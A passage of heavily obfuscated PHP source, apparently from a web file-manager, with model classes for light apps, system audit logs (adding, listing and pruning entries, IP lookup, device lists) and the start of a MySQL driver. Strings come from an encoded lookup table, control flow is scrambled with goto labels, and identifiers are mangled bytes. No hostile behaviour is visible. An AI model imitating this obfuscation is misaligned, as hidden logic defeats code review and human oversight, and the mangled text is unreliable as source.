$Dİ‹òÀšù =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($Aİ©†µˆºï)) { return; } $DÒ›Ó’¯ƒ = array($Dİ‹òÀšù[419] => array($Dİ‹òÀšù[7], $Aİ©†µˆºï)); goto EºÙâøïÄª; EºÙâøïÄª: $A´ì–›Ó‚Æ = Model($Dİ‹òÀšù[1121])->where($DÒ›Ó’¯ƒ)->field($Dİ‹òÀšù[369])->select(); if (!$A´ì–›Ó‚Æ) { return; } $A´ì–›Ó‚Æ = array_to_keyvalue($A´ì–›Ó‚Æ, $Dİ‹òÀšù[33], $Dİ‹òÀšù[369]); goto b‘¡ÓéÕ¶; f›¯Áõ­•·: } private function removeShareItems($e¶õµ ¢ê‚) { goto F‘±Î§…Æß; cÜïéãÒ¬: $ağ©Î¸Œ—á = Model($fº‚Ÿ¦´Ä[2089])->where($DŸÇªˆ…ëÏ)->field($fº‚Ÿ¦´Ä[441])->select(); if (empty($ağ©Î¸Œ—á)) { return; } $F”Ë†ÔŒµö = array_to_keyvalue($ağ©Î¸Œ—á, $fº‚Ÿ¦´Ä[33], $fº‚Ÿ¦´Ä[441]); goto FÒÖ«éï¶£; F‘±Î§…Æß: $fº‚Ÿ¦´Ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d¦‚§šÌŞ = "\173\151\157\x3a{$e¶õµ ¢ê‚}\175\57"; $DŸÇªˆ…ëÏ = array($fº‚Ÿ¦´Ä[369] => 0, $fº‚Ÿ¦´Ä[1023] => array($fº‚Ÿ¦´Ä[752], "{$d¦‚§šÌŞ}\x25")); goto cÜïéãÒ¬; FÒÖ«éï¶£: Model($fº‚Ÿ¦´Ä[538])->remove($F”Ë†ÔŒµö); goto DÍ­ÄŠ¦à; DÍ­ÄŠ¦à: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\114\x69\147\150\164\101\x70\x70"; public $modelType = "\123\x79\163\164\x65\x6d\x4f\160\x74\x69\157\x6e"; public $field = array("\156\x61\x6d\145", "\x67\162\x6f\x75\x70", "\x64\x65\163\x63", "\143\157\x6e\x74\x65\x6e\164"); public function listData($f×Ã¦Î…Œë = false, $CØÏœ‡ìÙê = "\x6d\157\144\151\x66\x79\124\x69\155\x65", $b¬ñ²®Ÿ´» = true) { return parent::listData($f×Ã¦Î…Œë, $CØÏœ‡ìÙê, $b¬ñ²®Ÿ´»); } public function remove($Bíê‚˜ÒÌÀ) { $E×–ÎÕÃ¶ = $this->findByName($Bíê‚˜ÒÌÀ); if (!$E×–ÎÕÃ¶) { return !1; } return parent::remove($E×–ÎÕÃ¶[$_SERVER[´Ù×Íå‘ÄõÛ][367]]); } public function add($F—†‹ßÉñœ) { if ($this->findByName($F—†‹ßÉñœ[$_SERVER[´Ù×Íå‘ÄõÛ][28]])) { return !1; } return parent::insert($F—†‹ßÉñœ); } public function update($EÕîòÀ’Ñ, $A¯ëõö’ğ) { $A‚öŒÏ‡ÕÛ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FË®—»ÄìÀ = $this->findByName($EÕîòÀ’Ñ); $EèÑ˜ÌÜ = $this->findByName($A¯ëõö’ğ[$A‚öŒÏ‡ÕÛ[28]]); if (!$FË®—»ÄìÀ || $EèÑ˜ÌÜ && $EèÑ˜ÌÜ[$A‚öŒÏ‡ÕÛ[367]] != $FË®—»ÄìÀ[$A‚öŒÏ‡ÕÛ[367]]) { return !1; } return parent::update($FË®—»ÄìÀ[$A‚öŒÏ‡ÕÛ[367]], $A¯ëõö’ğ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\x6d\x5f\154\x6f\147"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\x54\151\x6d\145", "\164\151\155\x65", "\151\x6e\163\x65\162\164", "\146\x75\x6e\143\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $E´ò¦Ò‹¶ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($E´ò¦Ò‹¶[2404] => LNG($E´ò¦Ò‹¶[2405]), $E´ò¦Ò‹¶[2406] => LNG($E´ò¦Ò‹¶[2407]), $E´ò¦Ò‹¶[2051] => LNG($E´ò¦Ò‹¶[2408]), $E´ò¦Ò‹¶[2409] => LNG($E´ò¦Ò‹¶[2410]), $E´ò¦Ò‹¶[2411] => LNG($E´ò¦Ò‹¶[2412]), $E´ò¦Ò‹¶[2413] => LNG($E´ò¦Ò‹¶[2414]), $E´ò¦Ò‹¶[2415] => LNG($E´ò¦Ò‹¶[2416]), $E´ò¦Ò‹¶[2417] => LNG($E´ò¦Ò‹¶[2418]), $E´ò¦Ò‹¶[2082] => LNG($E´ò¦Ò‹¶[2419]), $E´ò¦Ò‹¶[2083] => LNG($E´ò¦Ò‹¶[2420]), $E´ò¦Ò‹¶[2421] => LNG($E´ò¦Ò‹¶[2422]), $E´ò¦Ò‹¶[2423] => LNG($E´ò¦Ò‹¶[2424]), $E´ò¦Ò‹¶[2425] => LNG($E´ò¦Ò‹¶[2426]), $E´ò¦Ò‹¶[2427] => LNG($E´ò¦Ò‹¶[2428]), $E´ò¦Ò‹¶[2080] => LNG($E´ò¦Ò‹¶[2429]), $E´ò¦Ò‹¶[2087] => LNG($E´ò¦Ò‹¶[2430]), $E´ò¦Ò‹¶[2431] => LNG($E´ò¦Ò‹¶[2432]), $E´ò¦Ò‹¶[2433] => LNG($E´ò¦Ò‹¶[2434]), $E´ò¦Ò‹¶[2435] => LNG($E´ò¦Ò‹¶[2436]), $E´ò¦Ò‹¶[2437] => LNG($E´ò¦Ò‹¶[2438]), $E´ò¦Ò‹¶[2090] => LNG($E´ò¦Ò‹¶[2439]), $E´ò¦Ò‹¶[2091] => LNG($E´ò¦Ò‹¶[2440]), $E´ò¦Ò‹¶[2441] => LNG($E´ò¦Ò‹¶[2442]), $E´ò¦Ò‹¶[2443] => LNG($E´ò¦Ò‹¶[2444]), $E´ò¦Ò‹¶[2445] => LNG($E´ò¦Ò‹¶[2446]), $E´ò¦Ò‹¶[2085] => LNG($E´ò¦Ò‹¶[2447]), $E´ò¦Ò‹¶[2448] => LNG($E´ò¦Ò‹¶[2449]), $E´ò¦Ò‹¶[2084] => LNG($E´ò¦Ò‹¶[2450]), $E´ò¦Ò‹¶[2451] => LNG($E´ò¦Ò‹¶[2452]), $E´ò¦Ò‹¶[2453] => LNG($E´ò¦Ò‹¶[2454]), $E´ò¦Ò‹¶[2455] => LNG($E´ò¦Ò‹¶[2455]), $E´ò¦Ò‹¶[2456] => LNG($E´ò¦Ò‹¶[2055]), $E´ò¦Ò‹¶[2457] => LNG($E´ò¦Ò‹¶[2458]), $E´ò¦Ò‹¶[2459] => LNG($E´ò¦Ò‹¶[2460]), $E´ò¦Ò‹¶[2461] => LNG($E´ò¦Ò‹¶[2462]), $E´ò¦Ò‹¶[2463] => LNG($E´ò¦Ò‹¶[2464]), $E´ò¦Ò‹¶[2465] => LNG($E´ò¦Ò‹¶[2466]), $E´ò¦Ò‹¶[2467] => LNG($E´ò¦Ò‹¶[2467]), $E´ò¦Ò‹¶[2468] => LNG($E´ò¦Ò‹¶[2469]), $E´ò¦Ò‹¶[2470] => LNG($E´ò¦Ò‹¶[2471]), $E´ò¦Ò‹¶[2472] => LNG($E´ò¦Ò‹¶[2473]), $E´ò¦Ò‹¶[2474] => LNG($E´ò¦Ò‹¶[2475]), $E´ò¦Ò‹¶[2476] => LNG($E´ò¦Ò‹¶[2477]), $E´ò¦Ò‹¶[2478] => LNG($E´ò¦Ò‹¶[2479])); } private function typeFile() { $FÕ‚Ò¨Ã¢¼ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E¡ß¸†²µó = array($FÕ‚Ò¨Ã¢¼[2087] => array($FÕ‚Ò¨Ã¢¼[2088]), $FÕ‚Ò¨Ã¢¼[2425] => array($FÕ‚Ò¨Ã¢¼[2480]), $FÕ‚Ò¨Ã¢¼[2427] => array($FÕ‚Ò¨Ã¢¼[2481]), $FÕ‚Ò¨Ã¢¼[2080] => array($FÕ‚Ò¨Ã¢¼[2081]), $FÕ‚Ò¨Ã¢¼[2433] => array(), $FÕ‚Ò¨Ã¢¼[2435] => array(), $FÕ‚Ò¨Ã¢¼[2437] => array(), $FÕ‚Ò¨Ã¢¼[2090] => array($FÕ‚Ò¨Ã¢¼[2092]), $FÕ‚Ò¨Ã¢¼[2091] => array($FÕ‚Ò¨Ã¢¼[2092]), $FÕ‚Ò¨Ã¢¼[2441] => array($FÕ‚Ò¨Ã¢¼[2482]), $FÕ‚Ò¨Ã¢¼[2443] => array($FÕ‚Ò¨Ã¢¼[2482]), $FÕ‚Ò¨Ã¢¼[2445] => array($FÕ‚Ò¨Ã¢¼[2483]), $FÕ‚Ò¨Ã¢¼[2431] => array($FÕ‚Ò¨Ã¢¼[2484]), $FÕ‚Ò¨Ã¢¼[2085] => array($FÕ‚Ò¨Ã¢¼[2485]), $FÕ‚Ò¨Ã¢¼[2448] => array($FÕ‚Ò¨Ã¢¼[2486]), $FÕ‚Ò¨Ã¢¼[2084] => array($FÕ‚Ò¨Ã¢¼[2086])); return $E¡ß¸†²µó; } private function typeAll() { goto f¼ÖëÄÇ»; f¼ÖëÄÇ»: $C—”˜£Ìò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b¹“…•Î…ñ = $this->typeList; $e“¶Òù·ñç = array_filter($this->typeFile()); goto F¨„ô¸¬öÒ; F¨„ô¸¬öÒ: foreach ($e“¶Òù·ñç as $aœé¶ëõÍõ => $FøƒÓæ‚µ) { $b¹“…•Î…ñ[$FøƒÓæ‚µ[0]] = $b¹“…•Î…ñ[$aœé¶ëõÍõ]; } $b¹“…•Î…ñ[$C—”˜£Ìò[2092]] = LNG($C—”˜£Ìò[2487]); $b¹“…•Î…ñ[$C—”˜£Ìò[2482]] = LNG($C—”˜£Ìò[2488]); goto dé˜õ«ÚÖ; dé˜õ«ÚÖ: return $b¹“…•Î…ñ; goto f¼‘÷´„¾; f¼‘÷´„¾: } public function addLog($e÷„¶ŸÖ½Ë, $bÕÈ®Ê¬å÷ = array()) { goto b–³Õà¢ùŸ; b–³Õà¢ùŸ: $cÎæ²Ñ¨¥Ã =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($this->typeList[$e÷„¶ŸÖ½Ë])) { return; } $fÂä÷ÉÔ‘æ = USER_ID ? USER_ID : (isset($bÕÈ®Ê¬å÷[$cÎæ²Ñ¨¥Ã[1441]]) ? $bÕÈ®Ê¬å÷[$cÎæ²Ñ¨¥Ã[1441]] : 0); goto eˆ¢Ù¹¸˜‚; eˆ¢Ù¹¸˜‚: $dªµÚ­¡ïƒ = get_client_ip(); if (!$bÕÈ®Ê¬å÷ || strlen(json_encode($bÕÈ®Ê¬å÷)) >= 1024) { $bÕÈ®Ê¬å÷ = array($cÎæ²Ñ¨¥Ã[2489] => $dªµÚ­¡ïƒ); } else { if (is_array($bÕÈ®Ê¬å÷)) { $bÕÈ®Ê¬å÷[$cÎæ²Ñ¨¥Ã[2489]] = $dªµÚ­¡ïƒ; } else { $bÕÈ®Ê¬å÷ = array($cÎæ²Ñ¨¥Ã[1038] => $bÕÈ®Ê¬å÷, $cÎæ²Ñ¨¥Ã[2489] => $dªµÚ­¡ïƒ); } } $bÕÈ®Ê¬å÷ = array($cÎæ²Ñ¨¥Ã[1431] => Session::sign(), $cÎæ²Ñ¨¥Ã[1432] => $fÂä÷ÉÔ‘æ, $cÎæ²Ñ¨¥Ã[29] => $e÷„¶ŸÖ½Ë, $cÎæ²Ñ¨¥Ã[1434] => json_encode($bÕÈ®Ê¬å÷)); goto eœôøà¦Â ; eœôøà¦Â : parent::add($bÕÈ®Ê¬å÷); goto C²ªËœŠŠ; C²ªËœŠŠ: } public function remove($EÜªÎ–…ùŠ) { $this->where(array($_SERVER[´Ù×Íå‘ÄõÛ][385] => $EÜªÎ–…ùŠ))->delete(); } private function _makeOrder($AÈÄØäñ‘Æ = '') { goto cµàôùÄùŒ; cµàôùÄùŒ: $fÆÈòŞ±ÄÀ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e¬Ç·¢‘Å = $fÆÈòŞ±ÄÀ[187]; $fÊ»¢§°Î = array($fÆÈòŞ±ÄÀ[402] => $fÆÈòŞ±ÄÀ[403], $fÆÈòŞ±ÄÀ[404] => $fÆÈòŞ±ÄÀ[405]); goto fĞ³ğÌ¯’¹; Aœ¢Àà«¨†: return $this->order($AÈÄØäñ‘Æ); goto cĞÖ‘³Ô„É; fĞ³ğÌ¯’¹: $f£â®…´Ç‰ = Input::get($fÆÈòŞ±ÄÀ[408], $fÆÈòŞ±ÄÀ[7], $fÆÈòŞ±ÄÀ[2266], array($fÆÈòŞ±ÄÀ[2192], $fÆÈòŞ±ÄÀ[404])); $f£â®…´Ç‰ = $fÊ»¢§°Î[$f£â®…´Ç‰]; $AÈÄØäñ‘Æ = $AÈÄØäñ‘Æ . "{$e¬Ç·¢‘Å}\x20{$f£â®…´Ç‰}"; goto Aœ¢Àà«¨†; cĞÖ‘³Ô„É: } public function get($cƒÑñŞÁ¼ = '') { goto b—ªÆÕà¤­; dœĞª®î¦ç: if ($cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[1441]]) { $A‹÷Ïë…Ú®[$a›ØÃ¢ö„÷[1441]] = $cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[1441]]; } if (isset($cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[703]])) { $bšÂµª¡£ = $cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[703]]; $b°„©™‰¨„ = isset($cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[449]]) ? $cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[449]] : time(); $A‹÷Ïë…Ú®[$a›ØÃ¢ö„÷[187]] = array($a›ØÃ¢ö„÷[321], array($bšÂµª¡£, $b°„©™‰¨„)); } if ($cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[29]]) { $AÜÙÅ«œ®¿ = explode($a›ØÃ¢ö„÷[47], $cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[29]]); $a¸­ÇË¤ÊŒ = $this->typeFile(); $BÏ«ÙÇù›ç = array(); foreach ($AÜÙÅ«œ®¿ as $cÈ¨÷á‰ğŒ) { $BÏ«ÙÇù›ç[] = $cÈ¨÷á‰ğŒ; if (isset($a¸­ÇË¤ÊŒ[$cÈ¨÷á‰ğŒ])) { $BÏ«ÙÇù›ç = array_merge($BÏ«ÙÇù›ç, $a¸­ÇË¤ÊŒ[$cÈ¨÷á‰ğŒ]); } } $BÏ«ÙÇù›ç = array_unique($BÏ«ÙÇù›ç); if ($BÏ«ÙÇù›ç) { $A‹÷Ïë…Ú®[$a›ØÃ¢ö„÷[29]] = array($a›ØÃ¢ö„÷[7], $BÏ«ÙÇù›ç); } } goto añÉ¿ì·–ê; b—ªÆÕà¤­: $a›ØÃ¢ö„÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$cƒÑñŞÁ¼) { show_json(array()); } $A‹÷Ïë…Ú® = array(); goto dœĞª®î¦ç; añÉ¿ì·–ê: if (!empty($cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[2489]])) { $A‹÷Ïë…Ú®[$a›ØÃ¢ö„÷[405]] = array($a›ØÃ¢ö„÷[752], "\45{$cƒÑñŞÁ¼[$a›ØÃ¢ö„÷[2489]]}\45"); } $E¢ˆ•¡ßã¤ = $this->_makeOrder()->where($A‹÷Ïë…Ú®)->selectPage(); if (empty($E¢ˆ•¡ßã¤[$a›ØÃ¢ö„÷[354]])) { show_json(array(), !0, $E¢ˆ•¡ßã¤[$a›ØÃ¢ö„÷[351]]); } goto f°¯£òÑ¾½; f°¯£òÑ¾½: $E¢ˆ•¡ßã¤[$a›ØÃ¢ö„÷[354]] = $this->logList($E¢ˆ•¡ßã¤[$a›ØÃ¢ö„÷[354]]); return $E¢ˆ•¡ßã¤; goto AæŒ’Ğº‹–; AæŒ’Ğº‹–: } private function ipAddress(&$cÉæÅ´È’) { $b’ôŸÃ¬ ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!empty($cÉæÅ´È’[$b’ôŸÃ¬ ì[2489]])) { $eé˜™­ó§ò = IpLocation::get($cÉæÅ´È’[$b’ôŸÃ¬ ì[2489]]); } else { $eé˜™­ó§ò = LNG($b’ôŸÃ¬ ì[2490]); } $cÉæÅ´È’[$b’ôŸÃ¬ ì[2491]] = $eé˜™­ó§ò; } private function descZipDownload($fªŠ¬®Ú¶ª, &$FŠõ¸†ò‘‰) { $AÙê‡£Ÿ„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($fªŠ¬®Ú¶ª[$AÙê‡£Ÿ„[2492]])) { return; } $F”£Ä„©ï = json_decode($fªŠ¬®Ú¶ª[$AÙê‡£Ÿ„[2492]], !0); foreach ($F”£Ä„©ï as $E„ÀæÄ±±) { if (!IO::init($E„ÀæÄ±±[$AÙê‡£Ÿ„[75]])) { continue; } if (!($fœ¬íÏà¥ˆ = IO::infoFull($E„ÀæÄ±±[$AÙê‡£Ÿ„[75]]))) { continue; } $fªŠ¬®Ú¶ª[$AÙê‡£Ÿ„[75]] = $E„ÀæÄ±±[$AÙê‡£Ÿ„[75]]; $FŠõ¸†ò‘‰[] = $fªŠ¬®Ú¶ª[$AÙê‡£Ÿ„[369]] = $fœ¬íÏà¥ˆ[$AÙê‡£Ÿ„[369]]; $FŠõ¸†ò‘‰[] = $fªŠ¬®Ú¶ª[$AÙê‡£Ÿ„[2309]] = $fœ¬íÏà¥ˆ[$AÙê‡£Ÿ„[463]]; break; } return $fªŠ¬®Ú¶ª; } private function getSourceList(&$eØà•‡«’Ì) { $BµôŠÌÑĞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CŸä¶ÄñÌ— = array(); foreach ($eØà•‡«’Ì as $aÁ‘ãåö®À => $f÷æ¤ä…ŠŞ) { goto c¸ÌÊè˜‡×; FôåÈ®‡éÃ: $CŸä¶ÄñÌ—[] = $Cëõâõ©³†[$BµôŠÌÑĞ[369]]; $CŸä¶ÄñÌ—[] = $Cëõâõ©³†[$BµôŠÌÑĞ[2309]]; if ($Cëõâõ©³†[$BµôŠÌÑĞ[29]] == $BµôŠÌÑĞ[494]) { $CŸä¶ÄñÌ—[] = $Cëõâõ©³†[$BµôŠÌÑĞ[405]][$BµôŠÌÑĞ[1011]]; $CŸä¶ÄñÌ—[] = $Cëõâõ©³†[$BµôŠÌÑĞ[405]][$BµôŠÌÑĞ[1012]]; } goto E×Ã‹ çİß; c¸ÌÊè˜‡×: $Cëõâõ©³† = json_decode($f÷æ¤ä…ŠŞ[$BµôŠÌÑĞ[405]], !0); if ($f÷æ¤ä…ŠŞ[$BµôŠÌÑĞ[29]] == $BµôŠÌÑĞ[2083]) { $Cëõâõ©³† = $this->descZipDownload($Cëõâõ©³†, $CŸä¶ÄñÌ—); $eØà•‡«’Ì[$aÁ‘ãåö®À][$BµôŠÌÑĞ[405]] = json_encode($Cëõâõ©³†); continue; } if (strpos($f÷æ¤ä…ŠŞ[$BµôŠÌÑĞ[29]], $BµôŠÌÑĞ[2310]) !== 0) { goto e™ã­Š˜Ğ¢; e°¯ğ•™ŒŞ: continue; goto DóªËÒ¨Ö¼; CÔ‹İôë¨Æ: $CŸä¶ÄñÌ—[] = $Cëõâõ©³†[$BµôŠÌÑĞ[369]] = $e©öøºãÎ[$BµôŠÌÑĞ[369]]; $CŸä¶ÄñÌ—[] = $Cëõâõ©³†[$BµôŠÌÑĞ[2309]] = $e©öøºãÎ[$BµôŠÌÑĞ[463]]; $eØà•‡«’Ì[$aÁ‘ãåö®À][$BµôŠÌÑĞ[405]] = json_encode($Cëõâõ©³†); goto e°¯ğ•™ŒŞ; e™ã­Š˜Ğ¢: if (!isset($Cëõâõ©³†[$BµôŠÌÑĞ[75]]) || strpos($f÷æ¤ä…ŠŞ[$BµôŠÌÑĞ[29]], $BµôŠÌÑĞ[2493]) !== 0) { continue; } if (!IO::init($Cëõâõ©³†[$BµôŠÌÑĞ[75]])) { continue; } if (!($e©öøºãÎ = IO::infoFull($Cëõâõ©³†[$BµôŠÌÑĞ[75]]))) { continue; } goto CÔ‹İôë¨Æ; DóªËÒ¨Ö¼: } goto FôåÈ®‡éÃ; E×Ã‹ çİß: if ($Cëõâõ©³†[$BµôŠÌÑĞ[29]] == $BµôŠÌÑĞ[2317]) { $CŸä¶ÄñÌ—[] = $Cëõâõ©³†[$BµôŠÌÑĞ[405]][$BµôŠÌÑĞ[369]]; } goto eÁˆ¿Îåöœ; eÁˆ¿Îåöœ: } if (!$CŸä¶ÄñÌ—) { return array(); } return Model($BµôŠÌÑĞ[753])->sourceListInfo($CŸä¶ÄñÌ—, !0); } private function logList($Cö“ÚÒá·š) { goto F«Õº‘ˆ; bÁ³ùİÒĞ‡: return $CïÑ›ÔÀ¶; goto F¨µ¿­ÔñŸ; Eƒ‰Š…´º: $EƒÎ‘«èÌ = array(); foreach ($Cö“ÚÒá·š as $e¯é×…¶˜õ => $aŠÏå—ƒ˜) { goto cÜÈïŒİ; e³Ï¬éí°­: $aŠÏå—ƒ˜[$E„îÙ´¦Çç[2265]] = $dáïÃñãø¼; $E÷Ÿ¾ä = json_decode($aŠÏå—ƒ˜[$E„îÙ´¦Çç[405]], !0); $aŠÏå—ƒ˜[$E„îÙ´¦Çç[2489]] = isset($E÷Ÿ¾ä[$E„îÙ´¦Çç[2489]]) ? $E÷Ÿ¾ä[$E„îÙ´¦Çç[2489]] : $E„îÙ´¦Çç[33]; goto C¤ßŒãÁ³»; C¤ßŒãÁ³»: $this->ipAddress($aŠÏå—ƒ˜); if (strpos($c‹…â•àïÒ, $E„îÙ´¦Çç[2310]) === 0 || isset($E÷Ÿ¾ä[$E„îÙ´¦Çç[2309]])) { goto DĞ¼µ×ÃÛö; Dì”¹Âí½: if ($E÷Ÿ¾ä[$E„îÙ´¦Çç[29]] == $E„îÙ´¦Çç[2317]) { $E÷Ÿ¾ä[$E„îÙ´¦Çç[405]][$E„îÙ´¦Çç[369]] = $A¶é©³¦ğ[$E÷Ÿ¾ä[$E„îÙ´¦Çç[405]][$E„îÙ´¦Çç[369]]]; } if ($E÷Ÿ¾ä[$E„îÙ´¦Çç[29]] == $E„îÙ´¦Çç[2078]) { $E÷Ÿ¾ä[$E„îÙ´¦Çç[2322]] = $E÷Ÿ¾ä[$E„îÙ´¦Çç[391]]; $E÷Ÿ¾ä[$E„îÙ´¦Çç[2309]] = $E÷Ÿ¾ä[$E„îÙ´¦Çç[2322]][$E„îÙ´¦Çç[369]]; $E÷Ÿ¾ä[$E„îÙ´¦Çç[391]] = !1; $E÷Ÿ¾ä[$E„îÙ´¦Çç[369]] = $E„îÙ´¦Çç[33]; } if ($E÷Ÿ¾ä[$E„îÙ´¦Çç[391]] && $E÷Ÿ¾ä[$E„îÙ´¦Çç[391]][$E„îÙ´¦Çç[371]] == $E„îÙ´¦Çç[1084]) { $EƒÎ‘«èÌ[] = $aŠÏå—ƒ˜[$E„îÙ´¦Çç[367]]; unset($Cö“ÚÒá·š[$e¯é×…¶˜õ]); continue; } goto e‚êãô²õ; DĞ¼µ×ÃÛö: $E÷Ÿ¾ä[$E„îÙ´¦Çç[391]] = $A¶é©³¦ğ[$E÷Ÿ¾ä[$E„îÙ´¦Çç[369]]]; $E÷Ÿ¾ä[$E„îÙ´¦Çç[2322]] = $A¶é©³¦ğ[$E÷Ÿ¾ä[$E„îÙ´¦Çç[2309]]]; if ($E÷Ÿ¾ä[$E„îÙ´¦Çç[29]] == $E„îÙ´¦Çç[494]) { $E÷Ÿ¾ä[$E„îÙ´¦Çç[405]][$E„îÙ´¦Çç[1011]] = $A¶é©³¦ğ[$E÷Ÿ¾ä[$E„îÙ´¦Çç[405]][$E„îÙ´¦Çç[1011]]]; $E÷Ÿ¾ä[$E„îÙ´¦Çç[405]][$E„îÙ´¦Çç[1012]] = $A¶é©³¦ğ[$E÷Ÿ¾ä[$E„îÙ´¦Çç[405]][$E„îÙ´¦Çç[1012]]]; } goto Dì”¹Âí½; e‚êãô²õ: if ($E÷Ÿ¾ä[$E„îÙ´¦Çç[2322]] && $E÷Ÿ¾ä[$E„îÙ´¦Çç[2322]][$E„îÙ´¦Çç[371]] == $E„îÙ´¦Çç[1084]) { $EƒÎ‘«èÌ[] = $aŠÏå—ƒ˜[$E„îÙ´¦Çç[367]]; unset($Cö“ÚÒá·š[$e¯é×…¶˜õ]); continue; } goto dñÁĞòæ²¸; dñÁĞòæ²¸: } $aŠÏå—ƒ˜[$E„îÙ´¦Çç[405]] = $E÷Ÿ¾ä; goto FÃ”¨ÄÅ; FÃ”¨ÄÅ: unset($aŠÏå—ƒ˜[$E„îÙ´¦Çç[2496]]); $CïÑ›ÔÀ¶[] = $aŠÏå—ƒ˜; goto d˜°ô…ŞøÚ; cÜÈïŒİ: $c‹…â•àïÒ = $aŠÏå—ƒ˜[$E„îÙ´¦Çç[29]]; $dáïÃñãø¼ = isset($D…Î¼ÛÑÌ»[$aŠÏå—ƒ˜[$E„îÙ´¦Çç[1441]]]) ? $D…Î¼ÛÑÌ»[$aŠÏå—ƒ˜[$E„îÙ´¦Çç[1441]]] : !1; $EÍßÁó‰ì‹ = strpos($c‹…â•àïÒ, $E„îÙ´¦Çç[2494]) === 0 ? LNG($E„îÙ´¦Çç[2495]) : LNG($E„îÙ´¦Çç[2490]); goto cç„ÓÆéÏ‡; cç„ÓÆéÏ‡: $aŠÏå—ƒ˜[$E„îÙ´¦Çç[28]] = isset($dáïÃñãø¼[$E„îÙ´¦Çç[28]]) ? $dáïÃñãø¼[$E„îÙ´¦Çç[28]] : LNG($E„îÙ´¦Çç[2490]); $aŠÏå—ƒ˜[$E„îÙ´¦Çç[2358]] = isset($dáïÃñãø¼[$E„îÙ´¦Çç[2358]]) ? $dáïÃñãø¼[$E„îÙ´¦Çç[2358]] : $E„îÙ´¦Çç[33]; $aŠÏå—ƒ˜[$E„îÙ´¦Çç[1347]] = isset($EÀªóæÓ½ˆ[$c‹…â•àïÒ]) ? $EÀªóæÓ½ˆ[$c‹…â•àïÒ] : $EÍßÁó‰ì‹; goto e³Ï¬éí°­; d˜°ô…ŞøÚ: } $this->clearSystemPathLog($EƒÎ‘«èÌ); goto bÁ³ùİÒĞ‡; b”°µªµêÑ: $A¶é©³¦ğ = $this->getSourceList($Cö“ÚÒá·š); $EÀªóæÓ½ˆ = $this->typeAll(); $CïÑ›ÔÀ¶ = array(); goto Eƒ‰Š…´º; F«Õº‘ˆ: $E„îÙ´¦Çç =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D’ïÊ‚Ì™ = array_to_keyvalue($Cö“ÚÒá·š, $E„îÙ´¦Çç[33], $E„îÙ´¦Çç[1441]); $D…Î¼ÛÑÌ» = Model($E„îÙ´¦Çç[479])->userListInfo(array_unique($D’ïÊ‚Ì™)); goto b”°µªµêÑ; F¨µ¿­ÔñŸ: } private function clearSystemPathLog($FÅÕóÓÚº) { $E¸„äÌ¡¬ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (count($FÅÕóÓÚº) == 0) { return; } $C©ÁÒöÓ‡³ = array($E¸„äÌ¡¬[367] => array($E¸„äÌ¡¬[7], array_unique($FÅÕóÓÚº))); $this->where($C©ÁÒöÓ‡³)->delete(); } public function deviceList($aàç«”šøö, $fÉ«–ËÑ¶è = 0) { $A“À‡™™ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D‡ñãêÖµø = array($A“À‡™™ï[1441] => $aàç«”šøö, $A“À‡™™ï[187] => array($A“À‡™™ï[931], $fÉ«–ËÑ¶è), $A“À‡™™ï[29] => $A“À‡™™ï[2051]); $B‡ŞµØÅÔô = array(); $bÈé‰Í†‡± = $this->field($A“À‡™™ï[2497])->where($D‡ñãêÖµø)->order($A“À‡™™ï[2320])->limit(50)->select(); foreach ($bÈé‰Í†‡± as $f³×Ë‘¯Õ‡ => $f™·çøùµÎ) { goto Fî¯—†ãÏ³; eÅ†«ƒë«: unset($c§†¡ÓÁì[$A“À‡™™ï[2489]]); $AùÍƒ‚‘•¾ = $this->deviceType($c§†¡ÓÁì[$A“À‡™™ï[2311]]); if (isset($B‡ŞµØÅÔô[$AùÍƒ‚‘•¾])) { continue; } goto D±†òøäòÌ; D±†òøäòÌ: $this->ipAddress($f™·çøùµÎ); $f™·çøùµÎ[$A“À‡™™ï[405]] = $c§†¡ÓÁì; $B‡ŞµØÅÔô[$AùÍƒ‚‘•¾] = $f™·çøùµÎ; goto D„´¥Â‘µ; Fî¯—†ãÏ³: if ($f³×Ë‘¯Õ‡ > 0 && abs($f™·çøùµÎ[$A“À‡™™ï[187]] - $bÈé‰Í†‡±[$f³×Ë‘¯Õ‡ - 1][$A“À‡™™ï[187]]) < 5) { continue; } $c§†¡ÓÁì = json_decode($f™·çøùµÎ[$A“À‡™™ï[405]], !0); $f™·çøùµÎ[$A“À‡™™ï[2489]] = isset($c§†¡ÓÁì[$A“À‡™™ï[2489]]) ? $c§†¡ÓÁì[$A“À‡™™ï[2489]] : $A“À‡™™ï[33]; goto eÅ†«ƒë«; D„´¥Â‘µ: } return array_values($B‡ŞµØÅÔô); } public function deviceType($F®á³¦¼Á¶) { return $F®á³¦¼Á¶; } } goto DâÕÊÛ¯å†; d‰äôá‰Äø: class DbMysql extends Db { public function __construct($Bîğ±»ù…œ = '') { $Eƒ˜µÏöéÍ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!extension_loaded($Eƒ˜µÏöéÍ[728])) { think_exception(think_lang($Eƒ˜µÏöéÍ[10]) . 